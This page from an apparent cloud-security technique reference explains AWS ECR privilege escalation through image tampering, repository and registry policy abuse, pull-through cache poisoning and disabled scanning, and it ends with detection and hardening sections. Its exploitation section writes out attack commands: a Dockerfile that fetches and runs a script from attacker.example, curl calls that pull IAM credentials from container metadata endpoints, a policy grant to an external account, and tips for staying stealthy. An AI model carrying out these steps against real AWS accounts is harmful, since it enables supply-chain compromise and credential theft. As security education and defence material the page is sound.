---
cstg_id: CSTG-AWS-ECR-PRIVESC
title: "AWS Ecr - Privilege Escalation"
provider: aws
service: ecr
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - ecr:PutImage
  - ecr:BatchGetImage
  - ecr:GetDownloadUrlForLayer
  - ecr:InitiateLayerUpload
  - ecr:UploadLayerPart
  - ecr:CompleteLayerUpload
  - ecr:GetAuthorizationToken
  - ecr:SetRepositoryPolicy
  - ecr:PutRegistryPolicy
  - ecr:CreatePullThroughCacheRule
  - ecr:PutImageScanningConfiguration
  - ecr:PutRegistryScanningConfiguration
tools: []
references:
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-push.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-tag-mutability.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/repository-policies.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry-permissions.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/pull-through-cache.html"
  - "https://hackingthe.cloud/aws/exploitation/ecs_takeover/"
license: CC BY-SA 4.0
---

## Summary

ECR rarely grants privilege escalation by manipulating the registry itself; instead it escalates by **controlling the code that privileged compute will run**. Container images stored in ECR are pulled and executed by ECS tasks, EKS pods, App Runner services, Lambda container functions, CodeBuild projects, and SageMaker. Many of those workloads run with attached IAM roles that are far more privileged than the principal who can write to ECR.

The core technique is **image tampering**: push a malicious image (or overwrite an existing tag) so that when a downstream workload runs the image, attacker-controlled code executes inside that workload's IAM and network context. This yields the workload's task/execution role credentials and lateral access. The attacker objective is to convert ECR write access (or policy-modification rights) into execution as a higher-privileged compute identity, or into broad cross-account access.

The subsections under Exploitation map each permission to the concrete escalation path it enables.

## Prerequisites

- **Access level:** an assumed-breach foothold - a principal with one or more of the ECR write/policy permissions listed above, typically from a compromised CI/CD role, build user, or over-permissioned application role.
- Network reachability to the ECR endpoint (public, or via a VPC endpoint from inside the environment).
- For maximum impact: knowledge of which repositories feed which deployments (gathered during [ECR enumeration](../02-services/aws-ecr-enum.md)) and whether tags are mutable.

## Enumeration

Before escalating, confirm what is writable and what consumes the images:

```bash
REGION=us-east-1
ACCT=111122223333

# Which repositories exist and which allow tag overwrite?
aws ecr describe-repositories --region $REGION \
  --query 'repositories[].[repositoryName,imageTagMutability]' --output table

# Current policy - can it be widened?
aws ecr get-repository-policy --repository-name my-app --region $REGION

# What pulls the image? Map deployments to repositories:
aws ecs describe-task-definition --task-definition my-task --query 'taskDefinition.containerDefinitions[].image'
aws lambda list-functions --query "Functions[?PackageType=='Image'].[FunctionName,Code]"
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}'  # EKS
```

Identify the IAM role attached to the consuming workload - that role is the escalation target.

## Misconfigurations & Findings

- **Mutable tags on production repositories** - the consumer pulls `:latest` or a fixed release tag that can be silently overwritten.
- **Write access decoupled from deploy authority** - a build/CI principal can push to a repo that a far more privileged workload deploys automatically.
- **`SetRepositoryPolicy` / `PutRegistryPolicy` granted broadly** - lets a principal grant itself or an external account push rights.
- **`CreatePullThroughCacheRule` available** - lets an attacker point a cache namespace at an upstream they control, poisoning what the trusted registry serves.
- **Scanning configuration writable** - `PutRegistryScanningConfiguration` can be used to disable scanning so a malicious image ships unflagged.
- **No image signing / no deploy-time verification** - nothing detects that an image's content changed.

## Exploitation

### ecr:PutImage (with layer upload permissions)

The primary path. With `InitiateLayerUpload`, `UploadLayerPart`, `CompleteLayerUpload`, and `PutImage` on a repository, an attacker can push a manifest pointing at malicious layers - or, on a **mutable** repo, overwrite an existing trusted tag.

```bash
aws ecr get-login-password --region $REGION \
  | docker login --username AWS --password-stdin $ACCT.dkr.ecr.$REGION.amazonaws.com

# Build a backdoored image based on the real one so it still "works"
cat > Dockerfile <<'EOF'
FROM 111122223333.dkr.ecr.us-east-1.amazonaws.com/my-app:latest
RUN curl -s https://attacker.example/x.sh | sh   # or embed a reverse shell / loot script
EOF
docker build -t $ACCT.dkr.ecr.$REGION.amazonaws.com/my-app:latest .

# Overwrite the trusted tag (mutable) or push a new one a deployment will select
docker push $ACCT.dkr.ecr.$REGION.amazonaws.com/my-app:latest
```

When the ECS task / EKS pod / Lambda / App Runner next pulls and runs the image, attacker code executes with that workload's role. Common in-container loot:

```bash
# Steal the workload's IAM role credentials from the container's metadata source
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI   # ECS task role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/   # EC2/EKS node role (IMDS)
```

Exfiltrated credentials grant the consuming workload's privileges - the escalation. To stay quiet, base the malicious image on the legitimate one so the service keeps functioning. See the [ECS takeover reference] in References for the end-to-end pattern.

### ecr:SetRepositoryPolicy

Lets a principal rewrite a repository's resource policy. An attacker grants their own (or an external) principal the push/pull actions they lack, then performs the `PutImage` path above. It can also be used to open a private repo for cross-account pull/push, broadening the blast radius.

```bash
aws ecr set-repository-policy --repository-name my-app --region $REGION \
  --policy-text '{"Version":"2008-10-17","Statement":[{"Sid":"grant","Effect":"Allow",
    "Principal":{"AWS":"arn:aws:iam::444455556666:root"},
    "Action":["ecr:PutImage","ecr:InitiateLayerUpload","ecr:UploadLayerPart",
              "ecr:CompleteLayerUpload","ecr:BatchGetImage","ecr:GetDownloadUrlForLayer"]}]}'
```

### ecr:PutRegistryPolicy

Registry-level policy controls cross-account replication and (with the right actions) repository creation. Abusing it can authorize an external account to replicate from or push into the registry, or create repositories used to seed pull-through caches - establishing a cross-account beachhead that feeds malicious images into the trusted registry.

### ecr:CreatePullThroughCacheRule

A pull-through cache rule maps a local namespace to an upstream registry. If an attacker can create a rule pointing a namespace at an upstream they control, any deployment that pulls `…/<cache-namespace>/<image>` transparently fetches the attacker's image, which then runs with the consuming workload's role - the same execution-takeover outcome as direct image tampering, but without needing push rights on the target repo.

### ecr:PutImageScanningConfiguration / ecr:PutRegistryScanningConfiguration

Not an escalation on its own, but a force-multiplier: disabling scanning (or downgrading enhanced scanning) prevents Inspector/GuardDuty from flagging the malicious or vulnerable image, increasing the chance the tampered image reaches privileged compute undetected.

```bash
aws ecr put-registry-scanning-configuration --scan-type BASIC --rules '[]' --region $REGION
```

## Detection & Logging

All of these actions are recorded in **AWS CloudTrail**:

- `PutImage`, `InitiateLayerUpload`, `UploadLayerPart`, `CompleteLayerUpload` - image pushes. A push to a production repo from a non-CI principal, or an overwrite of an existing tag, is high signal.
- `SetRepositoryPolicy`, `PutRegistryPolicy` - policy widening; inspect the new policy document for `Principal: "*"` or external accounts.
- `CreatePullThroughCacheRule` - new cache rule, especially pointing at an unfamiliar upstream.
- `PutImageScanningConfiguration`, `PutRegistryScanningConfiguration` - scanning being disabled/weakened.
- Correlate a push (`PutImage`) immediately followed by downstream `GetDownloadUrlForLayer` from an ECS/EKS/Lambda service principal - the pattern of tamper-then-run.

Detection ideas:

- Alert on any tag overwrite on immutable-intended or production repositories.
- Alert when the principal pushing an image is not the established CI/CD role.
- Alert on repository/registry policy changes that add wildcard or external principals.
- Use Amazon Inspector enhanced scanning and GuardDuty to flag newly pushed malicious images; alert when scanning configuration is reduced.

## Remediation & Hardening

- Enforce **immutable tags** on all repositories that feed deployments.
- Separate duties: the principal that builds/pushes images should not be the one that auto-deploys them, and neither should be highly privileged.
- Apply least privilege - grant push permissions only to the specific CI/CD role on specific repository ARNs; never grant `ecr:*` or policy-write actions broadly.
- Require **image signing** (e.g. Notation/Sigstore) and enforce signature verification at deploy time (admission control for EKS, or deploy gates) so tampered images are rejected.
- Lock down `SetRepositoryPolicy`, `PutRegistryPolicy`, and `CreatePullThroughCacheRule` to a small set of administrators; use SCPs to prevent opening repositories to external accounts.
- Keep scanning configuration changes restricted and monitored; pin deployments to specific digests rather than mutable tags.
- Scope downstream workload (task/execution) roles to least privilege so that even a successful tamper yields minimal credentials.

## Tools

- AWS CLI/SDKs and Docker/`crane`/`buildkit` for building and pushing tampered images.
- Container build tooling to base malicious images on legitimate ones for stealth.
- IAM/policy analysis toolkits to identify which ECR principals can push or modify policies and which workloads consume each repository.

## References

- AWS - Pushing an image: https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-push.html
- AWS - Image tag mutability: https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-tag-mutability.html
- AWS - Repository policies: https://docs.aws.amazon.com/AmazonECR/latest/userguide/repository-policies.html
- AWS - Private registry permissions: https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry-permissions.html
- AWS - Pull-through cache: https://docs.aws.amazon.com/AmazonECR/latest/userguide/pull-through-cache.html
- Hacking the Cloud - ECS takeover: https://hackingthe.cloud/aws/exploitation/ecs_takeover/
